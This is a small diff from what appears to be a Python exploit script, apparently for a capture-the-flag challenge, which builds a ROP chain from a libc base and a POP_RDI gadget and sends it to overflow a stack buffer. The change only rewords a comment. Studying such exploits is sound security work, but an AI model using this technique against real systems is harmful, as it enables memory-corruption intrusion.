@@ -125,7 +125,7 @@ if __name__ == "__main__":
     payload += p64(0xcafebabedeadbeef)
     payload += p64(0)
     payload += p64(LIBC_BASE + POP_RDI )
-    payload += ROP # now we can overwrite the stack more than before
+    payload += ROP # now we can overwrite the stack more than 24 bytes.
 
     r.send(p64(len(payload)))
     r.send(payload)
